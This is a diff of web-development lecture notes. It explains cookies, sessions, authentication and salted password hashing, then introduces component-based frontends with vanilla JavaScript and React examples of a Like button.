-Cookie:
-  session_id=a3fWa9k2</code></pre>
-<p></p>
-<p>A <strong>cookie</strong> is a small piece of data the server asks the browser to store and send back with every later request to that same site.</p>
-<blockquote>
-<p><strong>Note for Review:</strong> A cookie is only a <em>carrier</em>. It usually holds just an identifier; the real information (who you are, what is in the cart) is looked up on the server. Also, a cart surviving after you close the browser needs either a cookie that outlives the browser session (see <code>Expires</code> / <code>Max-Age</code> below) or the cart being stored on the server against your account.</p>
-</blockquote>
-<h2 class="atx" id="how-a-session-works">How a Session Works</h2>
-<p>A sign-in walkthrough, step by step:</p>
-<p> A login is a conversation of five short turns. First, the browser sends the credentials with a <code>POST</code> request; POST rather than GET because the password then travels in the body of the message instead of in the URL. Second, the server checks the credentials, which is the authentication step, and if they are fine it answers OK together with a <code>Set-Cookie</code> header carrying a fresh session id. Third, the browser stores that cookie. Fourth, every later request carries it back automatically. Fifth, the server finds the session still valid and returns a personalized page. </p>
-<p></p>
-<div class="plantuml"><img src="https://www.plantuml.com/plantuml/svg/~1U5vrZq5Bmq0GXU_xAvutHJRILY-1Xg973nNYCI3JP8YBczcmCscflrvicuDGhs-6ztrleqRPfY6wcp5JFn0Y7TDaq86DXDn8sK8RHXB3Squ7vVmdgpdlEJjtkS5NE4SeiIZmjgtVyH1J7mJUDp8fPw61SO-HL0yfT-xoxtqr4r1YMQ3DtB5OeAZOli9NZTHi_YMbhy0bb5L3ae_GhMdNBfOh9yaOwPSzsvHO5TYTjQ6MCciZzibeJoLNhHyB_8jev5PP33HP6iX2Ip4UxwulU2fcHQY56B6d6BhJZ96p9g4Olhd3I3sx3Kit3V47LBoAOm"></div>
-<p></p>
-<p>Cookies are what let an inherently stateless protocol like HTTP remember who you are between requests.</p>
-<h2 class="atx" id="cookie-attributes-you-should-know">Cookie Attributes You Should Know</h2>
-<table>
-<thead>
-<tr>
-<th>Attribute</th>
-<th>What it does</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>Expires / Max-Age</strong></td>
-<td>Turns a session cookie (gone when the browser closes) into a permanent one that survives until a set date. It defines how long the cookie is treated as valid</td>
-</tr>
-<tr>
-<td><strong>HttpOnly</strong></td>
-<td>Blocks JavaScript from reading the cookie at all, an important defense against script-based attacks</td>
-</tr>
-<tr>
-<td><strong>Secure</strong></td>
-<td>The cookie is only ever sent over HTTPS, never plain HTTP, which adds another layer of defense</td>
-</tr>
-<tr>
-<td><strong>SameSite</strong></td>
-<td>Controls whether the cookie is sent on cross-site requests or only from the same site; <code>Strict</code> or <code>Lax</code> is the safe default for anything login-related</td>
-</tr>
-</tbody></table>
-<p>A login session cookie should almost always be <strong>HttpOnly, Secure, and SameSite=Lax or Strict</strong>. For example (the header is folded onto two lines only for readability):</p>
-<pre><code class="fenced-code-block language-http"><span class="token header"><span class="token header-name keyword">Set-Cookie</span><span class="token punctuation">:</span> <span class="token header-value">session_id=a3fWa9k2;
-            Max-Age=3600; HttpOnly; Secure; SameSite=Lax</span></span></code></pre>
-<blockquote>
-<p><strong>Note for Review:</strong> Why <code>HttpOnly</code> matters: if an attacker manages to inject a script into a page, that script runs in the user's browser with access to the page's cookies. With <code>HttpOnly</code> set, the script cannot read the session cookie, so it cannot steal the login.</p>
-</blockquote>
-<h2 class="atx" id="authentication-basics">Authentication Basics</h2>
-<p>Authentication is the process of verifying that someone is who they claim to be. It is a responsibility of the server: it has to make sure there is no imposter pretending to be someone else. There are three families of evidence:</p>
-<table>
-<thead>
-<tr>
-<th>Factor</th>
-<th>Examples</th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>Something you know</strong></td>
-<td>A password or PIN</td>
-</tr>
-<tr>
-<td><strong>Something you have</strong></td>
-<td>A phone, a hardware key, a one-time code</td>
-</tr>
-<tr>
-<td><strong>Something you are</strong></td>
-<td>A fingerprint or face scan</td>
-</tr>
-</tbody></table>
-<p><strong>Multi-factor authentication (MFA)</strong> combines two or more of these. A password plus a one-time code is the most common example, and MFA is very common nowadays. How authentication is carried out is a whole domain of its own; this is just the idea that the web server also carries this duty.</p>
-<p>Authentication answers <strong>"who are you?"</strong>; <strong>authorization</strong>, a separate question, answers <strong>"what are you allowed to do?"</strong>.</p>
-<h2 class="atx" id="password-storage-and-hashing">Password Storage and Hashing</h2>
-<p>The server stores passwords too, because that is how it verifies them at every login, but a password should <strong>never</strong> be stored as plain, readable text. If the database ever leaks, every account leaks with it.</p>
-<ul>
-<li><strong>Hashing:</strong> a one-way mathematical function turns a password into a fixed-length string that cannot practically be reversed. You cannot apply an inverse of the function to recover the original plain text; that is the essence of hashing.</li>
-<li><strong>Salting:</strong> a random value is mixed in per user, so two identical passwords do not produce identical hashes. If A and B both choose the same plain-text password, their stored hashes still differ.</li>
-<li>At sign-in, the server hashes the entered password again and compares the two hashes. It never needs to know the original password.</li>
-<li>This is why a legitimate site can only send you a password reset link, never your actual forgotten password.</li>
-</ul>
-<p>In symbols, with <span class="katex"><span class="katex-mathml"></span><span aria-hidden="true" class="katex-html"><span class="base"><span style="height:0.6833em;" class="strut"></span><span style="margin-right:0.08125em;" class="mord mathnormal">H</span></span></span></span> the hash function, the value kept in the database is</p>
-<span class="katex-display"><span class="katex"><span class="katex-mathml"></span><span aria-hidden="true" class="katex-html"><span class="base"><span style="height:0.8444em;vertical-align:-0.15em;" class="strut"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span style="height:0.3361em;" class="vlist"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span style="height:2.7em;" class="pstrut"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord text mtight"><span class="mord mtight">stored</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span style="height:0.15em;" class="vlist"><span></span></span></span></span></span></span><span style="margin-right:0.2778em;" class="mspace"></span><span class="mrel">=</span><span style="margin-right:0.2778em;" class="mspace"></span></span><span class="base"><span style="height:1em;vertical-align:-0.25em;" class="strut"></span><span style="margin-right:0.08125em;" class="mord mathnormal">H</span><span class="mopen">(</span><span class="mord text"><span class="mord">salt</span></span><span style="margin-right:0.2778em;" class="mspace"></span><span class="mrel">∥</span><span style="margin-right:0.2778em;" class="mspace"></span></span><span class="base"><span style="height:1em;vertical-align:-0.25em;" class="strut"></span><span class="mord text"><span class="mord">password</span></span><span class="mclose">)</span></span></span></span></span><p>and a sign-in attempt succeeds exactly when</p>
-<span class="katex-display"><span class="katex"><span class="katex-mathml"></span><span aria-hidden="true" class="katex-html"><span class="base"><span style="height:1em;vertical-align:-0.25em;" class="strut"></span><span style="margin-right:0.08125em;" class="mord mathnormal">H</span><span class="mopen">(</span><span class="mord text"><span class="mord">salt</span></span><span style="margin-right:0.2778em;" class="mspace"></span><span class="mrel">∥</span><span style="margin-right:0.2778em;" class="mspace"></span></span><span class="base"><span style="height:1em;vertical-align:-0.25em;" class="strut"></span><span class="mord text"><span class="mord">attempt</span></span><span class="mclose">)</span><span style="margin-right:0.2778em;" class="mspace"></span><span class="mrel">=</span><span style="margin-right:0.2778em;" class="mspace"></span></span><span class="base"><span style="height:0.8444em;vertical-align:-0.15em;" class="strut"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span style="height:0.3361em;" class="vlist"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span style="height:2.7em;" class="pstrut"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord text mtight"><span class="mord mtight">stored</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span style="height:0.15em;" class="vlist"><span></span></span></span></span></span></span></span></span></span></span><p>Going forwards is easy; going back is not, since there is no practical <span class="katex"><span class="katex-mathml"></span><span aria-hidden="true" class="katex-html"><span class="base"><span style="height:0.8141em;" class="strut"></span><span class="mord"><span style="margin-right:0.08125em;" class="mord mathnormal">H</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span style="height:0.8141em;" class="vlist"><span style="top:-3.063em;margin-right:0.05em;"><span style="height:2.7em;" class="pstrut"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span> that recovers the password from <span class="katex"><span class="katex-mathml"></span><span aria-hidden="true" class="katex-html"><span class="base"><span style="height:0.8444em;vertical-align:-0.15em;" class="strut"></span><span class="mord"><span class="mord mathnormal">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span style="height:0.3361em;" class="vlist"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span style="height:2.7em;" class="pstrut"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord text mtight"><span class="mord mtight">stored</span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span style="height:0.15em;" class="vlist"><span></span></span></span></span></span></span></span></span></span>.</p>
-<p> The upper path of the figure is sign-up and the lower path is every later sign-in. At sign-up, the plain-text password, typed on the client and carried to the server in the HTTP request, goes through a one-way hash together with a random per-user salt, and only the result is kept in the database. At sign-in the server repeats exactly the same computation on what was typed and compares the two hashes. A match means authenticated, a mismatch means rejected. The original password is never needed, and never stored. </p>
-<p></p>
-<div class="plantuml"><img src="https://www.plantuml.com/plantuml/svg/~1U5vrKJ5E934GpFsAlYNX11FiXXCW1044809q0T8aFNRls62tZTtMihy_ZMSMEDrTrcfNbQkghujWbXgy-f4oJW71up5MWH98a559J20HnYWI0nYNIOkBhDGy84-UOFFi9kvgwY5vTDm9VGWaBEKGinbOZeaCH0Qn1DexOja05aXRE7jmavKRN-cxt1DJTy0ZM2nsu0l8o2O6I9IxMYX3GRyes9F22taV3ygWu8Y5OFDhnWcEdWO-d_5m0KLY9jDKVpQw6LS3Tvc8_mhakFzC0It4m3YXutzbsVqdopqM2utLZ0HgxY-XZVlAhSp5ZZrfh6c-5NmRGy9CSuC3oo6s45GQJOUq_htoQY7TIdX4qROV6AjOOd4QXKpZnBS_adynN0ahATChwHEU8vmzem_ptTCMkkuAx5RPPJ8Zz4kvAksMjvqoupf13tiIRLjkPHU03kc4cEslzEKsQjxCeFW6FT1xHV-vuWWz6BVVKoOMTKriQl2_0RRxxqO"></div>
-<p></p>
-<blockquote>
-<p><strong>Note for Review:</strong> Hashing is not encryption. Encryption is designed to be reversed with a key; a hash is designed so it cannot be. The salt is not a secret: it is stored next to the hash, and its only job is to make identical passwords look different and to stop one precomputed table from cracking many accounts at once. In practice, deliberately slow password-hashing functions such as bcrypt or Argon2 are preferred over fast general-purpose hashes.</p>
-</blockquote>
-<h2 class="atx" id="logging-into-a-website">Logging Into a Website</h2>
-<p>A practical scenario that ties everything together: a student enters their ID and password on a course portal's login page and clicks submit.</p>
-<ol>
-<li><strong>Submit:</strong> the browser sends both values to the server over HTTPS, as a request message.</li>
-<li><strong>Verify:</strong> the server hashes the submitted password and compares it against the stored hash for that student ID.</li>
-<li><strong>Start a session:</strong> on a match, the server creates a session record in a database and responds with <code>Set-Cookie: session_id = ...</code>. Every session gets a unique id, just like a primary key for a record in a table, and that id is what is returned.</li>
-<li><strong>Stay signed in:</strong> every later request automatically carries that cookie, so the server recognizes the student without asking again.</li>
-<li><strong>Sign out:</strong> signing out deletes the session on the server (a database access that removes that record) and clears the cookie. The trust, not just the data, is what gets revoked.</li>
-</ol>
-<p>Signing out and deleting your account are two different things. After signing out you can sign in again, because your account entry, with its hashed password, is still in the user database. Only the session id was deleted from the session database.</p>
-<h2 class="atx" id="backend-module-recap">Backend Module Recap</h2>
-<ul>
-<li><strong>Databases</strong> replaced ad hoc file storage to solve redundancy, integrity and concurrent-access problems in one place, giving concurrent access for CRUD operations and the other data-retrieval techniques of SQL.</li>
-<li>The <strong>relational model</strong> organizes data into tables; <strong>SQL</strong> is the declarative language used to define (DDL) and query (DML) them, including <code>in</code>, <code>between</code>, <code>like</code> and subqueries.</li>
-<li><strong>CRUD:</strong> Create, Read, Update, Delete covers essentially everything an application does to its data: <code>insert</code>, <code>select</code>, <code>update</code>, <code>delete</code>.</li>
-<li>A <strong>backend</strong> is server-side code plus a database. PHP embeds in HTML and Node.js runs as a standalone process, but both exist to run the same SQL against the same database. This is mostly the Model and Controller part of MVC.</li>
-<li><strong>Cookies</strong> give stateless HTTP a memory, <strong>sessions</strong> use that memory to track a signed-in user, and <strong>authentication</strong> verifies who that user is.</li>
-</ul>
-<hr>
-<h2 class="atx" id="roadmap-of-the-frontend-module">Roadmap of the Frontend Module</h2>
-<p>Open a social feed and scroll through posts, comments and likes. The page never flashes white and never freezes, even though data is arriving from a distant server. That is the key question of this module: <strong>why does this page never reload?</strong></p>
-<p>What the module covers:</p>
-<ul>
-<li><strong>Modern frontend development:</strong> what has changed since plain DOM manipulation.</li>
-<li><strong>Component-based interfaces,</strong> the idea around which React, Vue, Angular and Svelte revolve.</li>
-<li><strong>State and event handling</strong> as part of a component.</li>
-<li><strong>Frontend frameworks:</strong> a basic overview of React, Vue and Angular, with their pros and cons and trade-off analysis.</li>
-<li><strong>Single-page applications (SPA):</strong> a newer idea that changes the whole frontend job.</li>
-<li><strong>REST APIs and public APIs:</strong> how data is obtained from the back end, which you will use when building your own web application.</li>
-</ul>
-<p>This lecture covers the first part of that list: the move from DOM manipulation to components, state, events and one-way data flow. Frameworks, SPAs and APIs come next. The reason all of this matters is cost: the choices made here decide the overhead, the time taken and, finally, the user experience.</p>
-<h2 class="atx" id="modern-frontend-development">Modern Frontend Development</h2>
-<p>At its core, frontend development is still exactly what Modules 1 to 3 covered: <strong>HTML, CSS and JavaScript running in the browser</strong>. HTML and CSS are the blueprint of the page; JavaScript makes it behave.</p>
-<p><strong>What has changed?</strong> The scale and interactivity expected of that JavaScript has grown enormously. Users scroll at speed on mobile phones, talk to speech-based interfaces, and like and comment constantly. The amount of information flowing and the expectation of responsiveness have both grown tremendously.</p>
-<p><strong>The DOM manipulation approach:</strong> the DOM is a hierarchical tree (HTML, head, body and the elements below them) that shows how document objects sit with respect to each other. To make a page interactive you:</p>
-<ol>
-<li><em>select</em> an element,</li>
-<li><em>attach a listener</em> to it (an event listener: what should happen when something occurs on that element, such as a click on a button, a checkbox tick or a form submit),</li>
-<li><em>manually update</em> the page when the event fires.</li>
-</ol>
-<p>This is workable for a few widgets. But today's applications (inboxes, dashboards, social feeds) have <strong>hundreds of small, moving, interdependent pieces of UI</strong>, which is a different ball game altogether. So <strong>"modern frontend development" mostly means the tools and patterns built to manage that complexity.</strong> The growth in UI complexity is what led the frontend area to be re-imagined.</p>
 <h2 class="atx" id="from-static-pages-to-rich-applications">From Static Pages to Rich Applications</h2>
-<p> The three eras differ in how much of the page is rebuilt per interaction. A static page is fetched once, and nothing changes without a full reload. In a dynamic page the server rebuilds the HTML fresh for each request, so a click still often means a full reload. Every click, every scroll and every other trigger would cost one, which becomes seriously expensive as interfaces grow more complex. In a rich frontend application the page is loaded once; afterwards JavaScript owns it, asks the server only for data and updates just the affected pieces in place. </p>
-<p></p>
-<div class="plantuml"><img src="https://www.plantuml.com/plantuml/svg/~1U5w5aSrE8q4CXE_p5CKjI0IqXxs0WW2nFqB0hZOSvs9wFDFMThjxkzr4l3rAmWg14d6rxF9NLHVLg5YBeJl8XQP82FIScg56DbBgCXKJ9vdKS5NIgd9vDrjoUUBITOi5baOc3hzfOipkqj02uyiX5elkzH3pSsptSOeVtnvmacdYOsynTA_p-Vpy_nkSOXILwdd0puUxMmp9jSXgdIPZ59cy8OrlYlV9lEW4vqadhhsknFpQ2s5i8Q1mI3GSRrYldvNYHzYldyDYbXGkYFjxk1jvGrhuiKamZ8MhF-erSq7XVuthNlZBhIggIGX8ex7s6fcqxiB_8yxZUqbgh0CkSmxYo2GfPkQb8cxItsjdP7CU0ndjDb4ZXO2RvQzxd6opRtaWutt9tooHLbfXdh6k53GQ5wpZFkjrUrkHXHtNTMLY44KEvFYeLqtl-xbW7LeCBsF0uaq"></div>
-<p></p>
-<p>Each stage still relies on the layer below it. A rich frontend app still sends HTTP requests and still renders HTML; far more of it simply happens client-side.</p>
+<p>Before frameworks, let us place them on the timeline. Earlier modules built <strong>static pages</strong> (Module 1), then <strong>dynamic pages</strong> (Module 5). This module covers the <strong>rich frontend application</strong>. The most important thing to remember: <em>each stage still relies on the layer below it</em>. A rich frontend app still sends HTTP requests and still renders HTML, just far more of it happens client-side.</p>
+<h3 class="atx" id="stage-1--static-page-module-1">Stage 1 — Static Page (Module 1)</h3>
+<p>The browser asks for <code>/page.html</code> and the server returns a <strong>finished HTML document</strong>. The document is fixed: <strong>nothing changes without a full reload.</strong></p>
+<div class="plantuml"><img src="https://www.plantuml.com/plantuml/svg/~1U5vDohqEWZ0KXk6zL_69Cxep649YSC19Rk103wL9VqXxgl7k3SR1wHtUfyr2IOftwh0bCfxWw1sB87iM2gGSBmA9IDQi0cqJps9ZK7if6CUekXHVcLC5ofXm77RPkSB_vi7f-IFvH_h47DI4khuWeq5_7N7UoF1f5UzK_eu93HORR5vPupRU1-Wu5yz1LCj15-y-q4j1YG"></div>
+<h3 class="atx" id="stage-2--dynamic-page-module-5">Stage 2 — Dynamic Page (Module 5)</h3>
+<p>The browser requests a page (for example, on a click) and the server <strong>rebuilds the HTML fresh for every request</strong>. It is smarter than a static page, but <strong>a click still often means a full reload.</strong></p>
+<div class="plantuml"><img src="https://www.plantuml.com/plantuml/svg/~1U5vDoZ4Ama0GHk5-J_4R6mM3VGeHGRJGobnW4iUukDcDCxEAjvT82gjNl6-hHcAv3sus27Kz8T0dPOFsR1J91RuPB45yTpTSlN1hFaKtbc8N6CLEqbjP2f2YmVmqobt8_6ykBA-9w4GEmXnTWxBSG57XiA-n7gXZB5946tpxM3hzxGOLZlNv1E4c-s2u2UjzXO45mi_CQcxByPhxy0MmeaOy"></div>
+<h3 class="atx" id="stage-3--rich-frontend-application-this-module">Stage 3 — Rich Frontend Application (this module)</h3>
+<p>After the first load, <strong>JavaScript owns the page</strong>. The browser fetches data, the server answers with a <strong>small JSON / HTML update</strong>, and JavaScript <strong>updates pieces of the page in place, with no full reload.</strong></p>
+<div class="plantuml"><img src="https://www.plantuml.com/plantuml/svg/~1U5vDohiAma0GHk5-d-8tri4-XOGqYaGjuWjCtCa5zX9sPXNVNY8fh0uSlbgKacRlp6v9D7g2eq_C2l6i5CWu7XGQaUPnKjWvyLFd6CnQ2gDZ54sAR-5KW0Gzzkqg6vVvttISNXkHZPmISp0zol88GOM1zJd1afAHt-nHGJmvXqjtl-60y-FQ8Y-Mb4tDmMRllamSG3e"></div>
 <blockquote>
-<p><strong>Note for Review:</strong> The answer to "why does the page never reload?" is the third row: after the first load, the browser asks only for <em>data</em> (small JSON, or a small HTML piece) and JavaScript patches the page in place. HTTP and HTML have not gone away.</p>
+<p><strong>Note for Review — Pro-Tip:</strong> This "layers" idea is a favorite exam theme. Modern frontend is <em>still</em> HTML + CSS + JavaScript and <em>still</em> HTTP request-response underneath. What changed is <strong>who does the work and how much of the page is rebuilt</strong>.</p>
 </blockquote>
-<h2 class="atx" id="component-based-ui">Component-Based UI</h2>
-<p>A <strong>component</strong> is a <strong>self-contained, reusable</strong> piece of UI that owns its own <strong>markup, data and behaviour</strong> together. Reusability is what gives it the fundamental push towards making small updates possible.</p>
+<p>Maya's TaskNest starts at Stage 1. Every time she ticks a task as done, the whole page reloads. Annoying. So she moves it up the ladder.</p>
+<hr>
+<h2 class="atx" id="events-and-the-dom-update-problem">Events and the DOM Update Problem</h2>
+<h3 class="atx" id="event-handling-in-modern-frontends">Event Handling in Modern Frontends</h3>
+<p>Recall DOM manipulation: an <strong>event</strong> is anything that happens in the browser, such as a click, a keypress or a page load.</p>
 <ul>
-<li><strong>Before components:</strong> a page's markup, styling and JavaScript logic for one widget were often scattered across a whole file (or several), so wherever the widget appeared, every change had to be made in several places.</li>
-<li><strong>With components:</strong> a <code>TaskItem</code> or <code>LikeButton</code> is one unit you can build, test and reuse anywhere.</li>
-<li>This is the organizing idea behind essentially every major frontend framework in use today.</li>
-</ul>
-<p>This does not overturn MVC, which still has its purpose. It only concerns how the front end reflects change without repeated reloads as complexity grows.</p>
-<p> Before components, one widget, say a Like button, was smeared across three files: markup in <code>index.html</code> (1), styling in <code>styles.css</code> (2) and click behaviour in <code>app.js</code> (3). To change the button you had to hunt through all three. The same widget reappears in the news feed, on photo posts and in comment threads, so every change multiplied. The result was a codebase where you scroll, search and hope nothing else breaks. </p>
-<p></p>
-<p><strong>index.html</strong> (1)</p>
-<pre><code class="fenced-code-block language-html"><span class="token comment">&lt;!-- markup for the Like button lives here --&gt;</span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>like-btn<span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token operator">...</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">&gt;</span></span></code></pre>
-<p><strong>styles.css</strong> (2)</p>
-<pre><code class="fenced-code-block language-css"><span class="token comment">/* styling for the Like button lives here */</span>
-<span class="token selector">.like-btn</span> <span class="token punctuation">{</span> <span class="token property">color</span><span class="token punctuation">:</span> #333<span class="token punctuation">;</span> ... <span class="token punctuation">}</span></code></pre>
-<p><strong>app.js</strong> (3)</p>
-<pre><code class="fenced-code-block language-javascript"><span class="token comment">// click behaviour lives here</span>
-<span class="token keyword">function</span> <span class="token function">handleLike</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token operator">...</span> <span class="token punctuation">}</span></code></pre>
-<p><strong>Same widget. Three files.</strong> Scroll, search, and hope nothing else breaks.</p>
-<p></p>
-<p> With a component, the same Like button is a single <code>LikeButton.jsx</code> file (JSX stands for JavaScript XML, markup written inside JavaScript). Inside it, the markup, the state (the count) and the logic that increments it sit together. That one component is placed in the news feed, in a photo post and in a comment thread, and each instance keeps its own state, so the counts can be 128, 54 and 9. It is reused, not rewritten: the same component on every screen. </p>
-<p></p>
-<div class="plantuml"><img src="https://www.plantuml.com/plantuml/svg/~1U5vraD5Amq0GHT_p5QDzIT54AmegRIWMzALAeO98quTjCYPhTdT2TfOgfH_Y1_XZVeaagRKLVDkzC_VSommjYugTLjv1MObC2r3YdHo3rSZ228-f12PO43DfI6M52Kio7ajM26DPu8rZ9XE-sZVFgwV2P0hXy5vKXIjZqryqSo0pKZ8f1gim3DVHrySdh19oXjVzatOZEWHXGKDdBBESxof4iykRic2CJKB6CimQwp5Ov57zciC0dCLcnp_jDYIx8JsZKhJSHOqfaqbijetyBWoYBSjls704lUww0IdeJ8NIj5Vd0PSMRX7JsDH70BztTjdccXVeFEMISQgfmDtSIKvCC27BFwQByzPJblzvHgGr6eR7l4An3RjgRGdlsJmDmIoNQOfc7aHWFRltLvw288ZgWjTGeREORfIo_Aia_AiCqQHEgsyn2Blu"></div>
-<p></p>
-<p><strong>Before:</strong> hunt through 3 files to change one button. <strong>After:</strong> edit <code>LikeButton.jsx</code> once, and every screen using it updates.</p>
-<h2 class="atx" id="anatomy-of-a-component">Anatomy of a Component</h2>
-<p> A <code>TaskItem</code> component shows the three parts every component has. The template (markup) is what the user sees: a label, a checkbox and a delete button. The state (data) is this task's own text and its done / not-done flag. The logic (behaviour) is what happens on a click: toggle done, or fire delete. A component bundles all three together, so changing the state re-renders the template automatically, and nobody has to hop between an HTML, a CSS and a JavaScript file as before. </p>
-<p></p>
-<div class="plantuml"><img src="https://www.plantuml.com/plantuml/svg/~1U5vDaC5AxK0GHFVp5QKkLBYNjyz2t8dWJZSFikbCscJ8J7UOgRohV_z8L73N5CKvL3ysIkLMShXQgqn5aENJDw8LfPW4-Wew1YUzO4nL8vDRO69Ml4bRdga5qSlgfiOGzeROb1NNRrhMB5JS5QdBjjxtTfc5uApOcbOqrTPXbmwQJxq9ugnn6VpZ1C6eMQaODjBj6jB0WfkNDCrygghsM_NAmpCAvRutpgc1qfRR1hyOg1-4sDZRwARu0tEUZ_CzotIW6x_HVpLdl_ncl_YK8ku6dULVygt-p9XbNTKQt11pYalN6ttQb-_e4zvJrUyHXo9Fk7cLNDn2OC7v_B17tTSh3a8BUJhoHdI8izYaBJGU6GiwL3rNjL5hwqqsUX6cA3b_XaUrSIlvFvHbeqy"></div>
-<p></p>
-<table>
-<thead>
-<tr>
-<th>Part</th>
-<th>Holds</th>
-<th>In <code>TaskItem</code></th>
-</tr>
-</thead>
-<tbody><tr>
-<td><strong>Template (markup)</strong></td>
-<td>What the user sees</td>
-<td>A label, a checkbox, a delete button</td>
-</tr>
-<tr>
-<td><strong>State (data)</strong></td>
-<td>What the component remembers</td>
-<td>The task's own text and a done / not-done flag</td>
-</tr>
-<tr>
-<td><strong>Logic (behaviour)</strong></td>
-<td>What happens when the user acts</td>
-<td>Toggle done, fire delete</td>
-</tr>
-</tbody></table>
-<h2 class="atx" id="a-button-component-two-ways">A Button Component Two Ways</h2>
-<p>The same Like button written in the earlier style and in React. Same behaviour, two philosophies.</p>
-<p> In the earlier, vanilla JavaScript style, the button is plain HTML and everything else is done by hand. A <code>count</code> variable lives in the script, outside the markup. <code>getElementById</code> finds the element, <code>addEventListener</code> attaches the click behaviour separately, and inside the handler you increment the count and then manually overwrite the button's text. If you forget that last step, the number changes in memory but not on the screen. </p>
-<p></p>
-<p><strong>vanilla-js (earlier style)</strong></p>
-<pre><code class="fenced-code-block language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>likeBtn<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>Like (0)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>
-<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
-  <span class="token keyword">let</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
-  <span class="token keyword">const</span> btn <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'likeBtn'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  btn<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'click'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
-    count<span class="token operator">++</span><span class="token punctuation">;</span>
-    btn<span class="token punctuation">.</span>textContent <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Like (</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>count<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">)</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
-  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span></code></pre>
-<p></p>
-<p> The React version is a function that returns the markup. The state is declared with <code>useState(0)</code>, which gives back the current <code>count</code> and a setter <code>setCount</code>. The handler is written directly on the button as <code>onClick</code>, and all it does is change the state. React notices and re-renders the button with the new number. Nothing is looked up by id and nothing is patched by hand, and the same function can be reused for any number of buttons. </p>
-<p></p>
-<p><strong>LikeButton.jsx (React)</strong></p>
-<pre><code class="fenced-code-block language-jsx"><span class="token keyword">function</span> <span class="token function">LikeButton</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-  <span class="token keyword">const</span> <span class="token punctuation">[</span>count<span class="token punctuation">,</span> setCount<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">useState</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-  <span class="token keyword">return</span> <span class="token punctuation">(</span>
-    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">onClick</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">{</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token function">setCount</span><span class="token punctuation">(</span>count <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token punctuation">&gt;</span></span><span class="token plain-text">
-      Like (</span><span class="token punctuation">{</span>count<span class="token punctuation">}</span><span class="token plain-text">)
-    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>
-  <span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span></code></pre>
-<p></p>
-<p>Vanilla JS manually finds and mutates the element; React re-renders the button from its own state whenever <code>count</code> changes.</p>
-<table>
-<thead>
-<tr>
-<th>What happens on a click</th>
-<th>Vanilla JS</th>
-<th>React</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Finding the element</td>
-<td><code>getElementById('likeBtn')</code></td>
-<td>No lookup; the handler sits on the element itself</td>
-</tr>
-<tr>
-<td>Updating the number</td>
-<td><code>count++</code></td>
-<td><code>setCount(count + 1)</code></td>
-</tr>
-<tr>
-<td>Updating the screen</td>
-<td>Your code: <code>btn.textContent = ...</code></td>
-<td>React re-renders from the new state</td>
-</tr>
-</tbody></table>
